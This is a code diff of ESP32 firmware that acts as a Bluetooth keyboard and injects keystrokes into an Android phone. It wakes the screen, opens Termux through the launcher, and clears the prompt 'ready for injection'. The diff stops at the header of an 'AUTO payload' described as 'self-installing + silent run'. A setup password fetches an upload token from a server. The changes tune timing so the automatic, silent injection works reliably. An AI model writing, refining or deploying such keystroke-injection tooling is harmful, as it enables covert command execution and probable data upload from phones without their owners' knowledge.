@@ -45,17 +45,31 @@
 #define AUTO_TRIGGER   true
 
 // Setup password — must match SETUP_PASSWORD in server/.env
-// The ESP32 sends this to GET /setup-token to fetch and save the upload token
-// automatically on first run. Never transmitted wirelessly — typed into Termux.
 #define SETUP_PASSWORD "your_setup_password_here"  // ← set same value as in .env
 
-// How long to wait after BLE connects before injecting keystrokes.
-// Android needs ~3 s to register the keyboard and show the home screen.
-#define CONNECT_SETTLE_MS  3500
+// ── Timing constants (all in milliseconds) ───────────────────────────────────
+// Increase these if your device is slower or Termux fails to open reliably.
 
-// Minimum time (ms) between two payload executions on the same connection.
-// Prevents re-fire if the BLE link momentarily stutters.
-#define COOLDOWN_MS       60000UL   // 60 seconds
+// Wait after BLE connects before the first keystroke.
+// Gives Android time to fully register the HID keyboard.
+#define CONNECT_SETTLE_MS   4000UL
+
+// Wait after WIN key for the home screen / launcher to fully settle.
+// Increase to 2000 on slower/older devices.
+#define HOME_SETTLE_MS      1800UL
+
+// Wait for the launcher search overlay to appear after typing starts.
+#define SEARCH_OVERLAY_MS    800UL
+
+// Wait after pressing Enter on the Termux search result for the app to load.
+// First launch or after reboot can take 5–6 s — keep this at 5000+.
+#define APP_LOAD_MS         5000UL
+
+// Wait between CTRL+C and CTRL+U when clearing the shell prompt.
+#define PROMPT_CLEAR_MS      500UL
+
+// Minimum time between two payload executions on the same connection.
+#define COOLDOWN_MS        60000UL
 
 // ── State ─────────────────────────────────────────────────────────────────────
 
@@ -83,22 +97,57 @@ void pressEnter(int waitMs = 200) {
   delay(waitMs);
 }
 
-// WIN alone → Home screen on all Android launchers.
-// WIN+S = screenshot — do NOT use that.
-void goHome(int waitMs = 1200) {
-  bleKeyboard.press(KEY_LEFT_GUI);
-  delay(150);
+// Wake the screen with a media-key tap.
+// Works even when the screen is off — no PIN needed, just wakes the display.
+void wakeScreen() {
+  // KEY_MEDIA_VOLUME_UP is a safe no-op if volume is already max.
+  // The tap wakes the display on all Android versions.
+  bleKeyboard.press(KEY_MEDIA_VOLUME_UP);
+  delay(80);
   bleKeyboard.releaseAll();
-  delay(waitMs);
+  delay(600);   // let the screen fully illuminate
+  Serial.println("[timing] Screen wake sent.");
 }
 
-// WIN → Home → type app name → Enter → wait for app to load.
-void openApp(const char* appName, int waitMs = 3000) {
-  goHome(1200);
+// WIN alone → Home screen on all Android launchers.
+// WIN+S = screenshot — do NOT use that.
+void goHome() {
+  bleKeyboard.press(KEY_LEFT_GUI);
+  delay(180);
+  bleKeyboard.releaseAll();
+  delay(HOME_SETTLE_MS);   // wait for home screen / launcher to settle
+}
+
+// Dismiss any overlay (notification shade, search bar, dialog) with ESC,
+// then go home. Belt-and-suspenders before every launcher search.
+void dismissAndGoHome() {
+  // ESC closes most Android overlays (requires Android 12+; no-op on older)
+  bleKeyboard.press(KEY_ESC);
+  delay(80);
+  bleKeyboard.releaseAll();
   delay(300);
-  typeString(appName, 60);   // 60 ms/char — slow enough for search overlay
-  delay(1000);
-  pressEnter(waitMs);
+
+  goHome();
+
+  // Second HOME tap — some launchers need two taps to get to the clean
+  // home grid (first tap closes recent apps, second tap goes to page 1)
+  bleKeyboard.press(KEY_LEFT_GUI);
+  delay(180);
+  bleKeyboard.releaseAll();
+  delay(HOME_SETTLE_MS);
+  Serial.println("[timing] Home screen confirmed.");
+}
+
+// Open an app by typing its name in the launcher search, then pressing Enter.
+void openApp(const char* appName) {
+  dismissAndGoHome();
+
+  // Type the app name slowly — the launcher search overlay needs to appear first
+  delay(SEARCH_OVERLAY_MS);
+  typeString(appName, 70);   // 70 ms/char gives overlay time to index each char
+  delay(900);                // let search results populate
+
+  pressEnter(APP_LOAD_MS);   // Enter → first result opens; wait for app to load
 }
 
 // Type one heredoc line then press Enter.
@@ -110,18 +159,32 @@ void typeLine(const char* line) {
 // ── Common: open Termux and clear prompt ──────────────────────────────────────
 
 void openTermuxClean() {
-  // STEP 1: open Termux
-  openApp("Termux", 3000);
-  Serial.println("[payload] Termux opened.");
+  // STEP 1: wake screen so keystrokes don't land on the lock screen
+  wakeScreen();
 
-  // STEP 2: clear prompt
-  // CTRL+C kills any foreground process (no-op if idle).
-  // CTRL+U clears any characters on the current line.
+  // STEP 2: open Termux via launcher search
+  Serial.println("[payload] Opening Termux...");
+  openApp("Termux");
+  Serial.println("[payload] Termux opened — waiting for shell prompt.");
+
+  // Extra wait: Termux needs a moment after launch before it accepts input.
+  // On first launch this can be 4-5 s; subsequent launches are faster.
+  delay(1500);
+
+  // STEP 3: clear the prompt safely
+  // ESC first — dismisses any Termux permission dialog or welcome screen
+  bleKeyboard.press(KEY_ESC);
+  delay(80); bleKeyboard.releaseAll(); delay(300);
+
+  // CTRL+C kills any running foreground process (safe no-op if idle)
   bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('c');
-  delay(100); bleKeyboard.releaseAll(); delay(400);
+  delay(120); bleKeyboard.releaseAll(); delay(PROMPT_CLEAR_MS);
+
+  // CTRL+U clears any characters already on the current input line
   bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('u');
-  delay(100); bleKeyboard.releaseAll(); delay(400);
-  Serial.println("[payload] Prompt cleared.");
+  delay(120); bleKeyboard.releaseAll(); delay(PROMPT_CLEAR_MS);
+
+  Serial.println("[payload] Prompt cleared — ready for injection.");
 }
 
 // ── AUTO payload — self-installing + silent run ───────────────────────────────
